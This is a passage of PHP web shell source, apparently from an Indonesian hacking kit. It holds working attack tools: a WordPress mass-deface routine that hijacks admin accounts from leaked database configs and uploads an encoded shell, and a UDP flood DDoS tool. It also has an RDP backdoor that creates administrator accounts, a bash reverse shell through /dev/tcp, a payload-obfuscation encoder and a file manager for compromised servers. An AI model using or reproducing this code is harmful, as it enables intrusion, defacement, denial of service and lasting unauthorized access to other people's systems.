   <div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
   flush();
   }
   echo '</center>';
   }


	elseif ($_GET['do'] == 'string') {
        $text = $_POST['code'];
?><center>
<center class='mybox'><h1>String Encode & Decode</h1>
<form method="post"><br>
<textarea class='mybox' cols=80 rows=10 name="code"></textarea><br><br>
<select size="1" name="ope">
<option value="urlencode" style='background:transparent;color:aqua;'>url</option>
<option value="base64" style='background:transparent;color:aqua;'>Base64</option>
<option value="ur" style='background:transparent;color:aqua;'>convert_uu</option>
<option value="json" style='background:transparent;color:aqua;'>json</option>
<option value="gzinflates" style='background:transparent;color:aqua;'>gzinflate - base64</option>
<option value="str2" style='background:transparent;color:aqua;'>str_rot13 - base64</option>
<option value="gzinflate" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - base64</option>
<option value="gzinflater" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - base64</option>
<option value="gzinflatex" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - gzinflate - base64</option>
<option value="gzinflatew" style='background:transparent;color:aqua;'>str_rot13 - convert_uu - url - gzinflate - str_rot13 - base64 - convert_uu - gzinflate - url - str_rot13 - gzinflate - base64</option>
<option value="str" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="url" style='background:transparent;color:aqua;'>base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
<option value="hexencode" style='background:transparent;color:aqua;'>Hex Encode/Decode</option>
<option value="md5" style='background:transparent;color:aqua;'><center>MD5 Hash</option>
<option value="sha1" style='background:transparent;color:aqua;'>SHA1 Hash</option>
<option value="str_rot13" style='background:transparent;color:aqua;'>ROT13 Hash</option>
<option value="strlen" style='background:transparent;color:aqua;'>strlen</option>
<option value="xxx" style='background:transparent;color:aqua;'>unescape</option>
<option value="bbb" style='background:transparent;color:aqua;'>charAt</option>
<option value="aaa" style='background:transparent;color:aqua;'>chr - bin2hex - substr</option>
<option value="www" style='background:transparent;color:aqua;'>chr</option>
<option value="sss" style='background:transparent;color:aqua;'>htmlspecialchars</option>
<option value="eee" style='background:transparent;color:aqua;'>escape</option></select>&nbsp;
<input class='kotak' type='submit' name='submit' value='Encrypt'>
<input class='kotak' type='submit' name='crack' value='Decrypt'>
</form>

<?php
        $submit = $_POST['submit'];
        if (isset($submit)) {
            $op = $_POST["ope"];
            switch ($op) {
                case 'base64':
                    $codi = base64_encode($text);
                break;
                case 'str':
                    $codi = (base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
                break;
                case 'json':
                    $codi = json_encode(utf8_encode($text));
                break;
                case 'gzinflate':
                    $codi = base64_encode(gzdeflate(str_rot13($text)));
                break;
                case 'gzinflater':
                    $codi = base64_encode(str_rot13(gzdeflate($text)));
                break;
                case 'gzinflatex':
                    $codi = base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
                break;
                case 'gzinflatew':
                    $codi = base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
                break;
                case 'gzinflates':
                    $codi = base64_encode(gzdeflate($text));
                break;
                case 'str2':
                    $codi = base64_encode(str_rot13($text));
                break;
                case 'urlencode':
                    $codi = rawurlencode($text);
                break;
                case 'hexencode':
                    $codi = bin2hex($text);
                break;
                case 'md5':
                    $codi = md5($text);
                break;
                case 'ur':
                    $codi = convert_uuencode($text);
                break;
                case 'str_rot13':
                    $codi = str_rot13($text);
                break;
                case 'sha1':
                    $codi = sha1($text);
                break;
                case 'strlen':
                    $codi = strlen($text);
                break;
                case 'xxx':
                    $codi = strlen(bin2hex($text));
                break;
                case 'bbb':
                    $codi = htmlentities(utf8_decode($text));
                break;
                case 'aaa':
                    $codi = chr(bin2hex(substr($text)));
                break;
                case 'www':
                    $codi = chr($text);
                break;
                case 'sss':
                    $codi = htmlspecialchars($text);
                break;
                case 'eee':
                    $codi = addslashes($text);
                break;
                case 'url':
                    $codi = base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
                break;
                default:
                break;
            }
        }
        // Decrypt Start Now !!
        $submit = $_POST['crack'];
        if (isset($submit)) {
            $op = $_POST["ope"];
            switch ($op) {
                case 'base64':
                    $codi = base64_decode($text);
                break;
                case 'str':
                    $codi = str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
                break;
                case 'json':
                    $codi = utf8_dencode(json_dencode($text));
                break;
                case 'gzinflate':
                    $codi = str_rot13(gzinflate(base64_decode($text)));
                break;
                case 'gzinflater':
                    $codi = gzinflate(str_rot13(base64_decode($text)));
                break;
                case 'gzinflatex':
                    $codi = gzinflate(str_rot13(gzinflate(base64_decode($text))));
                break;
                case 'gzinflatew':
                    $codi = str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
                break;
                case 'gzinflates':
                    $codi = gzinflate(base64_decode($text));
                break;
                case 'str2':
                    $codi = str_rot13(base64_decode($text));
                break;
                case 'urlencode':
                    $codi = rawurldecode($text);
                break;
                case 'hexencode':
                    $codi = quoted_printable_decode($text);
                break;
                case 'ur':
                    $codi = convert_uudecode($text);
                break;
                case 'url':
                    $codi = base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
                break;
                default:
                break;
            }
        }
        echo '<textarea cols=80 rows=10 class="mybox" readonly>' . $codi . '</textarea></center><BR><BR>';
}



 elseif($_GET['do'] == 'auto_dwp2') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$link = explode("\r\n", $_POST['link']);
		$script = htmlspecialchars($_POST['script']);
		$user = "Unknown1337";
		$pass = "Unknown1337";
		$passx = md5($pass);
		foreach($link as $dir_config) {
			$config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
			} else {
				echo "[+] $target <br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {
				$site = "$target/wp-login.php";
				$site2 = "$target/wp-admin/theme-install.php?upload";
				$b1 = anucurl($site2);
				$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
				$b = lohgin($site, $site2, $user, $pass, $wp_sub);
				$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
				$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
				$www = "m.php";
				$fp5 = fopen($www,"w");
				fputs($fp5,$upload3);
				$post2 = array(
						"_wpnonce" => "$anu2",
						"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
						"themezip" => "@$www",
						"install-theme-submit" => "Install Now",
						);
				$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
					  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
					  curl_setopt($ch, CURLOPT_POST, 1);
					  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
					  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
					  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
				$data3 = curl_exec($ch);
					  curl_close($ch);
				$y = date("Y");
				$m = date("m");
				$namafile = "id.php";
				$fpi = fopen($namafile,"w");
				fputs($fpi,$script);
				$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
					   curl_setopt($ch6, CURLOPT_POST, true);
					   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
					   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
					   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  	   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		 	   curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
				$postResult = curl_exec($ch6);
					   curl_close($ch6);
				$as = "$target/k.php";
				$bs = anucurl($as);
				if(preg_match("#$script#is", $bs)) {
                   	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                   	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
                    } else {
                    echo "[-] <font color='red'>gagal mepes...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=lime>$user</font><br>";
                    echo "[+] password: <font color=lime>$pass</font><br><br>";     
                    }
            	mysql_close($conn);
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface V.2</h1>
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/Exc_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Unknown1337' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
} elseif($_GET['do'] == 'ddosattack')
	{
?>
<form action=" " method="post">
<center><br><br><br>
Your IP: <font color="red"><b><?php echo $my_ip; ?></b></font>&nbsp;(Don't DoS yourself nub)<br><br>
<table class="tabnet" style="width:333px;padding:0 1px;">
<th colspan="5">Ddos Tool</th>
<tr><tr><td>IP Target</td><td>:</td>
<td><input type="text" class="inputz" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';"/>
</td></tr>
<tr><td>Time</td><td>:</td>
<td><input type="text" class="inputz" name="time" size="48" maxlength="25"  value = "time (in seconds)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';"/>
</td></tr>

<tr><td>Port</td><td>:</td>
<td><input type="text" class="inputz" name="port" size="48" maxlength="5"  value = "port" onblur = "if ( this.value=='' ) this.value = 'port';" onfocus = " if ( this.value == 'port' ) this.value = '';"/>
</td></tr></tr></table></b><br>
<input type="submit" class="inputzbut" name="fire" value="  Firee !!!   ">
<br><br>
<center>
After initiating the DoS attack, please wait while the browser loads.
</center>

</form>
</center>
<?php
    $submit = $_POST['fire'];
    if (isset($submit)) {
        $packets = 0;
        $ip = $_POST['ip'];
        $rand = $_POST['port'];
        set_time_limit(0);
        ignore_user_abort(FALSE);
        $exec_time = $_POST['time'];
        $time = time();
        print "Flooded: $ip on port $rand <br><br>";
        $max_time = $time + $exec_time;
        for ($i = 0;$i < 65535;$i++) {
            $out.= "X";
        }
        while (1) {
            $packets++;
            if (time() > $max_time) {
                break;
            }
            $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
            if ($fp) {
                fwrite($fp, $out);
                fclose($fp);
            }
        }
        echo "Packet complete at " . time('h:i:s') . " with $packets (" . round(($packets * 65) / 1024, 2) . " mB) packets averaging " . round($packets / $exec_time, 2) . " packets/s 
";
    }
} elseif($_GET['do'] == 'krdp_shell') {
    if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
        if($_POST['create']) {
            $user = htmlspecialchars($_POST['user']);
            $pass = htmlspecialchars($_POST['pass']);
            if(preg_match("/$user/", exe("net user"))) {
                echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
            } else {
                $add_user   = exe("net user $user $pass /add");
                $add_groups1 = exe("net localgroup Administrators $user /add");
                $add_groups2 = exe("net localgroup Administrator $user /add");
                $add_groups3 = exe("net localgroup Administrateur $user /add");
                echo "[ RDP ACCOUNT INFO ]<br>
                ------------------------------<br>
                IP: <font color=lime>".gethostbyname($_SERVER['HTTP_HOST'])."</font><br>
                Username: <font color=lime>$user</font><br>
                Password: <font color=lime>$pass</font><br>
                ------------------------------<br><br>
                [ STATUS ]<br>
                ------------------------------<br>
                ";
                if($add_user) {
                    echo "[add user] -> <font color='lime'>Berhasil</font><br>";
                } else {
                    echo "[add user] -> <font color='red'>Gagal</font><br>";
                }
                if($add_groups1) {
                    echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
                } elseif($add_groups2) {
                    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
                } elseif($add_groups3) {
                    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
                } else {
                    echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
                }
                echo "------------------------------<br>";
            }
        } elseif($_POST['s_opsi']) {
            $user = htmlspecialchars($_POST['r_user']);
            if($_POST['opsi'] == '1') {
                $cek = exe("net user $user");
                echo "Checking username <font color=lime>$user</font> ....... ";
                if(preg_match("/$user/", $cek)) {
                    echo "[ <font color=lime>Sudah ada</font> ]<br>
                    ------------------------------<br><br>
                    <pre>$cek</pre>";
                } else {
                    echo "[ <font color=red>belum ada</font> ]";
                }
            } elseif($_POST['opsi'] == '2') {
                $cek = exe("net user $user Exorcism1337");
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[change password: <font color=lime>Exorcism1337</font>] -> ";
                    if($cek) {
                        echo "<font color=lime>Berhasil</font>";
                    } else {
                        echo "<font color=red>Gagal</font>";
                    }
                } else {
                    echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
                }
            } elseif($_POST['opsi'] == '3') {
                $cek = exe("net user $user /DELETE");
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[remove user: <font color=lime>$user</font>] -> ";
                    if($cek) {
                        echo "<font color=lime>Berhasil</font>";
                    } else {
                        echo "<font color=red>Gagal</font>";
                    }
                } else {
                    echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
                }
            } else {
                //
            }
        } else {
            echo "-- Create RDP --<br>
            <form method='post'>
            <input type='text' name='user' placeholder='username' value='Exorcism1337' required>
            <input type='text' name='pass' placeholder='password' value='Exorcism1337' required>
            <input type='submit' name='create' value='>>'>
            </form>
            -- Option --<br>
            <form method='post'>
            <input type='text' name='r_user' placeholder='username' required>
            <select name='opsi'>
            <option value='1'>Cek Username</option>
            <option value='2'>Ubah Password</option>
            <option value='3'>Hapus Username</option>
            </select>
            <input type='submit' name='s_opsi' value='>>'>
            </form>
            ";
        }
    } else {
        echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
    }
} elseif($_GET['do'] == 'network') {
	echo "<center><form method='post'>
	Back Connect: <br>
	<input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'><br>
	<input type='text' placeholder='port' name='port_bc' value='6969'><br>
	<input type='submit' name='sub_bc' value='Reverse' style='width: 210px;'>
	</form>";
	if(isset($_POST['sub_bc'])) {
		$ip = $_POST['ip_bc'];
		$port = $_POST['port_bc'];
		exe("/bin/bash -i >& /dev/tcp/$ip/$port 0>&1");
	}
	echo "</center>";
} elseif($_GET['do'] == 'krdp_shell') {
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			$user = htmlspecialchars($_POST['user']);
			$pass = htmlspecialchars($_POST['pass']);
			if(preg_match("/$user/", exe("net user"))) {
				echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
			} else {
				$add_user   = exe("net user $user $pass /add");
    			$add_groups1 = exe("net localgroup Administrators $user /add");
    			$add_groups2 = exe("net localgroup Administrator $user /add");
    			$add_groups3 = exe("net localgroup Administrateur $user /add");
    			echo "[ RDP ACCOUNT INFO ]<br>
    			------------------------------<br>
    			IP: <font color=lime>".gethostbyname($_SERVER['HTTP_HOST'])."</font><br>
    			Username: <font color=lime>$user</font><br>
    			Password: <font color=lime>$pass</font><br>
    			------------------------------<br><br>
    			[ STATUS ]<br>
    			------------------------------<br>
    			";
    			if($add_user) {
    				echo "[add user] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add user] -> <font color='red'>Gagal</font><br>";
    			}
    			if($add_groups1) {
        			echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups2) {
        		    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
    			} elseif($add_groups3) { 
        		    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
    			} else {
    				echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
    			}
    			echo "------------------------------<br>";
			}
		} elseif($_POST['s_opsi']) {
			$user = htmlspecialchars($_POST['r_user']);
			if($_POST['opsi'] == '1') {
				$cek = exe("net user $user");
				echo "Checking username <font color=lime>$user</font> ....... ";
				if(preg_match("/$user/", $cek)) {
					echo "[ <font color=lime>Sudah ada</font> ]<br>
					------------------------------<br><br>
					<pre>$cek</pre>";
				} else {
					echo "[ <font color=red>belum ada</font> ]";
				}
			} elseif($_POST['opsi'] == '2') {
				$cek = exe("net user $user Unknown1337");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>Unknown1337</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} elseif($_POST['opsi'] == '3') {
				$cek = exe("net user $user /DELETE");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[remove user: <font color=lime>$user</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
					}
				} else {
					echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
				}
			} else {
				//
			}
		} else {
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='Unknown1337' required>
			<input type='text' name='pass' placeholder='password' value='Unknown1337' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
			<input type='text' name='r_user' placeholder='username' required>
			<select name='opsi'>
			<option value='1'>Cek Username</option>
			<option value='2'>Ubah Password</option>
			<option value='3'>Hapus Username</option>
			</select>
			<input type='submit' name='s_opsi' value='>>'>
			</form>
			";
		}
	} else {
		echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
	}
} elseif($_GET['act'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
}elseif($_GET['act'] == 'chmod'){
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=chmod&dir=$dir&file=".$_GET['file']."'><b>chmod</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br><br>";


    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_GET['file'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="10" value="'.substr(sprintf('%o', fileperms($_GET['file'])), -4).'" />
        <input type="hidden" name="path" value="'.$_GET['file'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';

    }

    elseif($_GET['act'] == 'chmod_dir'){
    echo '</table><br /><center>'.$_POST['dir'].'<br>';


    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_GET['dir'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done.</font><br />';
            }else{
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="10" value="'.substr(sprintf('%o', fileperms($_GET['dir'])), -4).'" />
        <input type="hidden" name="path" value="'.$_GET['dir'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';

    }



 elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	$delete_dir = rmdir($dir);
	if($delete_dir) {
		$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
	} else {
		$act = "<font color=red>could not remove ".basename($dir)."</font>";
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=chmod&dir=$dir&file=".$_GET['file']."'>chmod</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=lime>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=chmod&dir=$dir&file=".$_GET['file']."'>chmod</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=chmod&dir=$dir&file=".$_GET['file']."'>chmod</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} elseif(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
	@header('Content-Description: File Transfer');
	@header('Content-Type: application/octet-stream');
	@header('Content-Disposition: attachment; filename="'.basename($file).'"');
	@header('Expires: 0');
	@header('Cache-Control: must-revalidate');
	@header('Pragma: public');
	@header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home"><center>Name</center></th>
			<th class="th_home"><center>Type</center></th>
			<th class="th_home"><center>Size</center></th>
			<th class="th_home"><center>Last Modified</center></th>
			<th class="th_home"><center>Owner/Group</center></th>
			<th class="th_home"><center>Permission</center></th>
			<th class="th_home"><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
